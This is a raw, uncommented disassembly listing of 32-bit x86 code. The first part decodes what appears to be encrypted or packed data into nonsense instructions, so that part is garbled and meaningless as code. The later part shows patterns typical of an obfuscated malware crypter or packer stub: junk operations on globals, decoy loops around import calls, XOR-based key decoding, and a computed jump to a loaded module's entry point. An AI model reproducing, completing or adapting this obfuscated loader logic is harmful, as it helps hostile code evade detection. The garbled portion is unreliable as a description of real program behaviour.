  40d5a5:	mov    bh,0x1c
  40d5a7:	lock mov edx,0xb3c52709
  40d5ad:	inc    ebx
  40d5ae:	mov    bl,0xba
  40d5b0:	in     al,dx
  40d5b1:	test   ecx,esp
  40d5b3:	push   ss
  40d5b4:	push   eax
  40d5b5:	cld    
  40d5b6:	or     BYTE PTR [ebp+0x7e96c0f0],al
  40d5bc:	inc    eax
  40d5bd:	inc    esp
  40d5be:	jnp    0x40d5f8
  40d5c0:	das    
  40d5c1:	jb     0x40d583
  40d5c3:	out    0x94,al
  40d5c5:	sti    
  40d5c6:	clc    
  40d5c7:	in     al,0xff
  40d5c9:	xchg   ebp,eax
  40d5ca:	scas   eax,DWORD PTR es:[edi]
  40d5cb:	xchg   edi,eax
  40d5cc:	mov    edx,0xb229229b
  40d5d1:	arpl   WORD PTR [ebx-0x1243d476],cx
  40d5d7:	adc    ecx,ebp
  40d5d9:	mov    esp,0x7514e3ac
  40d5de:	popf   
  40d5df:	ret    
  40d5e0:	inc    edi
  40d5e1:	jle    0x40d5eb
  40d5e3:	inc    esi
  40d5e4:	into   
  40d5e5:	cwde   
  40d5e6:	sbb    al,0x3a
  40d5e8:	mov    dl,0xa1
  40d5ea:	shl    DWORD PTR [esi],1
  40d5ec:	cmp    al,0xf9
  40d5ee:	fist   DWORD PTR [eax-0x244af506]
  40d5f4:	dec    ebp
  40d5f5:	sbb    edi,DWORD PTR ds:0xfb8c49ed
  40d5fb:	sbb    dl,BYTE PTR [ecx]
  40d5fd:	push   esi
  40d5fe:	and    al,0x9a
  40d600:	adc    ecx,esi
  40d602:	jl     0x40d5d2
  40d604:	push   es
  40d605:	in     al,dx
  40d606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d607:	daa    
  40d608:	sub    ecx,ebx
  40d60a:	cmp    al,0xbc
  40d60c:	div    DWORD PTR [edx]
  40d60e:	add    BYTE PTR [eax-0x68191ec7],dl
  40d614:	pusha  
  40d615:	add    DWORD PTR [eax],edi
  40d617:	fdiv   DWORD PTR [esi-0x7b]
  40d61a:	mul    edi
  40d61c:	dec    esi
  40d61d:	inc    ecx
  40d61e:	mov    bh,0xf7
  40d620:	jb     0x40d663
  40d622:	fnstcw WORD PTR [eax-0x4e]
  40d625:	stos   DWORD PTR es:[edi],eax
  40d626:	sub    BYTE PTR [edx-0x50],al
  40d629:	fisubr DWORD PTR [eax]
  40d62b:	outs   dx,DWORD PTR ds:[esi]
  40d62c:	retf   0x910
  40d62f:	sbb    BYTE PTR [eax],bl
  40d631:	inc    ebx
  40d632:	stos   BYTE PTR es:[edi],al
  40d633:	jecxz  0x40d5f5
  40d635:	outs   dx,BYTE PTR ds:[esi]
  40d636:	dec    esi
  40d637:	push   ss
  40d638:	and    al,0x6c
  40d63a:	pop    esi
  40d63b:	popa   
  40d63c:	fsubr  QWORD PTR [ebp+esi*8-0x13]
  40d640:	push   0xb50a8728
  40d645:	pushf  
  40d646:	cmp    cl,BYTE PTR [ecx]
  40d648:	in     al,0x3a
  40d64a:	bound  esp,QWORD PTR [ecx+edx*2+0x589320fe]
  40d651:	dec    ebx
  40d652:	hlt    
  40d653:	push   esp
  40d654:	loop   0x40d63b
  40d656:	cmp    DWORD PTR [ebx-0x73],ebx
  40d659:	sar    DWORD PTR [ebx-0x2d080f52],cl
  40d65f:	fucomp st(0)
  40d661:	push   DWORD PTR [eax-0x7b]
  40d664:	fwait
  40d665:	out    0x95,eax
  40d667:	lea    eax,[esi+0x3d7a48be]
  40d66d:	pop    esi
  40d66e:	mov    dh,0x7d
  40d670:	adc    eax,0x1711ff41
  40d675:	arpl   WORD PTR [ecx-0x4a746d6a],ax
  40d67b:	push   edx
  40d67c:	dec    ecx
  40d67d:	jae    0x40d66e
  40d67f:	std    
  40d680:	scas   al,BYTE PTR es:[edi]
  40d681:	push   cs
  40d682:	cdq    
  40d683:	and    BYTE PTR [edx-0x45],al
  40d686:	mov    bh,0xa7
  40d688:	pop    esi
  40d689:	jne    0x40d62b
  40d68b:	repnz pop ds
  40d68d:	push   cs
  40d68e:	(bad)  
  40d68f:	mov    ebx,0xb3651bf1
  40d694:	push   ss
  40d695:	mov    ds:0xeba3f976,al
  40d69a:	out    dx,eax
  40d69b:	int    0xda
  40d69d:	shl    BYTE PTR [edi-0x44],1
  40d6a0:	call   0x51ca8416
  40d6a5:	jae    0x40d648
  40d6a7:	test   BYTE PTR ds:0x865438c1,0x2
  40d6ae:	repnz div BYTE PTR ss:[ebp+0x72]
  40d6b3:	lods   eax,DWORD PTR ds:[esi]
  40d6b4:	xchg   bx,ax
  40d6b6:	and    dh,dl
  40d6b8:	add    bh,BYTE PTR [esi-0x77]
  40d6bb:	mov    eax,ds:0x6768bae2
  40d6c0:	mov    cl,bh
  40d6c2:	xor    DWORD PTR [esi+0x68362830],edi
  40d6c8:	jge    0x40d6ce
  40d6ca:	fwait
  40d6cb:	xor    eax,0x7f5336fd
  40d6d0:	adc    al,ah
  40d6d2:	call   0x485e:0x3f164eb
  40d6d9:	repnz pop ss
  40d6db:	fwait
  40d6dc:	mov    esi,cr6
  40d6df:	jl     0x40d6df
  40d6e1:	inc    esi
  40d6e2:	push   esi
  40d6e3:	push   ecx
  40d6e4:	cmc    
  40d6e5:	sub    al,0xaf
  40d6e7:	sbb    BYTE PTR [eax-0x5f192b97],bl
  40d6ed:	cli    
  40d6ee:	stos   DWORD PTR es:[edi],eax
  40d6ef:	jno    0x40d696
  40d6f1:	pop    es
  40d6f2:	or     al,0x66
  40d6f4:	mov    edi,0x9abb2f1d
  40d6f9:	imul   ebx,DWORD PTR [ebp+edx*8-0x29],0xffffffa5
  40d6fe:	jnp    0x40d738
  40d700:	add    WORD PTR [edi-0x17],di
  40d704:	popf   
  40d705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d706:	int    0x81
  40d708:	xor    cl,BYTE PTR [esi]
  40d70a:	mov    ds:0xffb31e58,al
  40d70f:	jb     0x40d6a2
  40d711:	test   eax,0xdfa1c2f5
  40d716:	pop    ecx
  40d717:	(bad)  
  40d718:	pop    ebx
  40d719:	repz fnop 
  40d71c:	js     0x40d747
  40d71e:	adc    eax,0xbb415594
  40d723:	js     0x40d77c
  40d725:	push   es
  40d726:	dec    esi
  40d727:	mov    bl,0x29
  40d729:	stc    
  40d72a:	clc    
  40d72b:	dec    edi
  40d72c:	cmp    DWORD PTR [edx-0x7],ebp
  40d72f:	int3   
  40d730:	or     eax,0x5da7fe0b
  40d735:	sub    bl,dl
  40d737:	mov    ebx,0xae3525d8
  40d73c:	pop    ebp
  40d73d:	outs   dx,DWORD PTR es:[esi]
  40d73f:	inc    esi
  40d740:	pop    ecx
  40d741:	lods   al,BYTE PTR ds:[esi]
  40d742:	(bad)  
  40d743:	(bad)  
  40d744:	push   esi
  40d745:	pop    ds
  40d746:	dec    ecx
  40d747:	in     eax,dx
  40d748:	scas   al,BYTE PTR es:[edi]
  40d749:	cmp    BYTE PTR [edi-0x376bd1e0],ah
  40d74f:	inc    ebx
  40d750:	aad    0x2b
  40d752:	dec    edx
  40d753:	fcmovnbe st,st(7)
  40d755:	test   DWORD PTR [esi-0x4ee5f86],ebp
  40d75b:	repnz test eax,0x6b12f78
  40d761:	jo     0x40d711
  40d763:	lods   eax,DWORD PTR ds:[esi]
  40d764:	xchg   esi,eax
  40d765:	or     BYTE PTR [ebp+ebx*2-0x5c807e08],cl
  40d76c:	push   DWORD PTR [edi-0x1d439fed]
  40d772:	sub    al,0x2
  40d774:	int3   
  40d775:	xchg   esi,eax
  40d776:	inc    edx
  40d777:	jne    0x40d7d2
  40d779:	sub    DWORD PTR [ecx],esi
  40d77b:	ror    DWORD PTR [esi+0x7d],1
  40d77e:	xchg   esi,eax
  40d77f:	mov    esp,0x73ac9083
  40d784:	mov    al,ds:0x3236526
  40d789:	pop    ecx
  40d78a:	clc    
  40d78b:	push   ebx
  40d78c:	retf   
  40d78d:	jae    0x40d758
  40d78f:	and    esp,ebp
  40d791:	lds    esi,FWORD PTR [eax]
  40d793:	(bad)  
  40d794:	enter  0x59fd,0x5e
  40d798:	retf   
  40d799:	arpl   WORD PTR [ebx+eiz*2+0x738083f9],cx
  40d7a0:	sub    ah,BYTE PTR [edx]
  40d7a2:	idiv   BYTE PTR [eax+0x5d]
  40d7a5:	mov    cl,0x57
  40d7a7:	push   eax
  40d7a8:	dec    ebx
  40d7a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7aa:	(bad)  
  40d7ab:	mov    dl,0xfd
  40d7ad:	outs   dx,BYTE PTR ds:[esi]
  40d7ae:	jae    0x40d7f7
  40d7b0:	dec    ebx
  40d7b1:	pushf  
  40d7b2:	dec    esi
  40d7b3:	cmp    al,0x41
  40d7b5:	mov    cl,0x49
  40d7b7:	fwait
  40d7b8:	adc    BYTE PTR [edi-0x2d196a75],bh
  40d7be:	inc    esp
  40d7bf:	pusha  
  40d7c0:	ss pop ds
  40d7c2:	inc    ecx
  40d7c3:	pusha  
  40d7c4:	sub    DWORD PTR [eax+0x41],0x28551b9a
  40d7cb:	fwait
  40d7cc:	stc    
  40d7cd:	and    DWORD PTR [esi],esp
  40d7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7d0:	rcr    DWORD PTR [edi],cl
  40d7d2:	add    eax,0xfce526b0
  40d7d7:	sub    esi,DWORD PTR [edi-0x24]
  40d7da:	add    eax,0x5acc9f6a
  40d7df:	or     eax,0xf6bc0f6e
  40d7e4:	pop    eax
  40d7e5:	sbb    DWORD PTR [ebp-0xf],ecx
  40d7e8:	cmp    eax,ecx
  40d7ea:	mov    ebx,0xde8911cc
  40d7ef:	sbb    eax,0x94a50342
  40d7f4:	inc    DWORD PTR [esp+eax*8-0x2885ed8e]
  40d7fb:	sub    edx,0x3d98c0d0
  40d801:	sbb    DWORD PTR [ecx+esi*4-0x7cbb12c6],0xffffffa2
  40d809:	adc    dl,bl
  40d80b:	popa   
  40d80c:	push   0x42de40b
  40d811:	mov    bl,0xf7
  40d813:	inc    esp
  40d814:	sub    al,BYTE PTR [ebx+0x14]
  40d817:	test   al,0xdc
  40d819:	rol    cl,1
  40d81b:	push   esp
  40d81c:	push   edi
  40d81d:	adc    dl,ah
  40d81f:	test   BYTE PTR [ebp+0x3b03c13c],0xf7
  40d826:	jge    0x40d821
  40d828:	fptan  
  40d82a:	mov    edx,0x44fe9dd5
  40d82f:	xor    al,0x45
  40d831:	lahf   
  40d832:	mov    edi,0xbf0224a9
  40d837:	mov    ebp,0xe69b9398
  40d83c:	loop   0x40d80b
  40d83e:	cld    
  40d83f:	loopne 0x40d8ab
  40d841:	sub    bh,cl
  40d843:	imul   edi,DWORD PTR [eax+0x76],0xffffff83
  40d847:	sahf   
  40d848:	fs pushf 
  40d84a:	push   es
  40d84b:	fldcw  WORD PTR [ecx-0x26e4fee9]
  40d851:	rcr    BYTE PTR [eax+0x56],0xac
  40d855:	xor    al,0x5
  40d857:	fcomp  DWORD PTR [ecx]
  40d859:	jle    0x40d809
  40d85b:	stos   DWORD PTR es:[edi],eax
  40d85c:	sbb    BYTE PTR [ebp+0x6],0xff
  40d860:	mov    BYTE PTR [ebp+ebx*2-0x3776a334],ch
  40d867:	pop    eax
  40d868:	das    
  40d869:	sub    BYTE PTR [ebp+0x7e888f76],bl
  40d86f:	add    al,0x2b
  40d871:	pop    ebp
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
